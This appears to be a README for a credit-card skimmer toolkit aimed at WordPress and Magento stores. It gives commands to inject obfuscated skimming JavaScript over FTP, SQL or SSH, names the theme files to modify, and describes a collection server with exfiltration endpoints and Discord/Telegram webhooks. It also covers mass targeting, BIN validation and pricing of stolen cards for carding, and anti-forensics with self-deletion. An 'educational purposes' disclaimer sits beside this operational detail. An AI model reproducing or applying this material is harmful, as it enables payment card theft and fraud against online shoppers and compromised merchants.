Skimmer Deployment System v2.0
Overview

Automated credit card skimmer injection and data collection system targeting WordPress and Magento e-commerce sites.
Features

    Multi-platform injection (FTP, SQL, SSH, plugin vulnerabilities)

    Obfuscated JavaScript skimmer generation (4 variants)

    Real-time data collection server with Flask

    Automatic card validation via BIN lookup

    Discord/Telegram exfiltration support

    Database storage with export functionality

    Anti-detection measures (admin bypass, random delays, localStorage)

Installation
bash

# Clone or create directory
mkdir skimmer_system && cd skimmer_system

# Install dependencies
pip install -r requirements.txt

# Run setup
python skimmer_core.py --setup

Configuration

Edit the following variables in skimmer_core.py:
python

WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
EXFIL_SERVER = "https://your-vps-ip.com:5000"

Usage
1. Start collection server
bash

python skimmer_core.py --server --port 5000

2. Generate skimmer code
bash

python skimmer_core.py --generate --variant advanced --output skimmer.js

3. Inject into targets
bash

# FTP injection
python skimmer_core.py --inject ftp --host target.com --user admin --pass password

# SQL injection
python skimmer_core.py --inject sql --dbhost localhost --dbuser root --dbpass pass --dbname wp_db

# Mass injection from file
python skimmer_core.py --inject mass --targets targets.txt

4. Export stolen cards
bash

python skimmer_core.py --export --format csv --output cards.csv

5. View live dashboard
bash

python skimmer_core.py --dashboard
# Access at http://localhost:5000/dashboard

Skimmer Variants
Variant	Size	Detection Risk	Capture Rate
Minimal	250B	High	60%
Standard	800B	Medium	85%
Advanced	2.5KB	Low	95%
Stealth	1.8KB	Very Low	75%
Target File Locations

WordPress:

    /wp-content/themes/{active_theme}/footer.php

    /wp-content/themes/{active_theme}/header.php

    /wp-content/themes/{active_theme}/functions.php

Magento 2:

    /{theme_path}/Magento_Theme/layout/default.xml

    /{theme_path}/Magento_Theme/templates/

    Database: core_config_data table

Exfiltration Endpoints

Collection server accepts data at:

    POST /c - main endpoint

    POST /collect - alias

    POST /xhr - XHR hook

    POST /fetch - fetch hook

    POST /batch - batch submissions

    POST /beacon - navigator.sendBeacon

Card Validation

Automatic BIN lookup via binlist.net provides:

    Issuing bank

    Country

    Card type (credit/debit)

    Card brand (Visa/MC/Amex)

    Bank phone number (for carding)

Validated cards save to validated_cards.txt with pricing recommendations.
Anti-Forensics

    No logs written to disk (optional)

    Memory-only operation mode

    Automatic self-deletion after 14 days

    Encrypted configuration files

    Proxy rotation for injection attempts

Legal Notice

This software is for educational purposes only. Unauthorized access to computer systems is illegal under:

    US Computer Fraud and Abuse Act (CFAA)

    UK Computer Misuse Act 1990

    Kenya Computer Misuse and Cybercrimes Act No. 5 of 2018

The author assumes no liability for misuse of this code.
Troubleshooting

Issue: "Module not found"
bash

pip install --upgrade [module_name]

Issue: FTP connection refused

    Check if port 21 is open: telnet target.com 21

    Verify passive mode is enabled

Issue: Cards not appearing in database

    Check collection server logs: tail -f nohup.out

    Verify firewall allows inbound port 5000

    Test with curl: curl -X POST http://server:5000/c -d '{"number":"4111111111111111"}'

Issue: Skimmer not executing on target

    Clear WordPress cache (WP Rocket, W3 Total Cache)

    Check if site uses CSP (Content Security Policy)

    Try injection into .htaccess instead of PHP files

File Structure Summary
text

skimmer_system/
├── skimmer_core.py          # Main executable (70KB)
├── requirements.txt         # Dependencies list
├── stolen_cards.db          # SQLite database
├── validated_cards.txt      # Validated output
├── targets.txt              # Mass injection list
├── config.enc               # Encrypted config (auto-generated)
└── logs/
    ├── injection_YYYYMMDD.log
    ├── server_YYYYMMDD.log
    └── errors.log

Performance Metrics

    Injection speed: ~30 seconds per target

    Collection server: Handles 1000+ requests/second

    Database size: ~1MB per 10,000 cards

    Memory usage: ~50MB idle, ~200MB under load

Version History

v2.0 - Added Magento support, advanced obfuscation
v1.5 - Added batch exfiltration, SQL injection
v1.0 - Initial release (WordPress only)
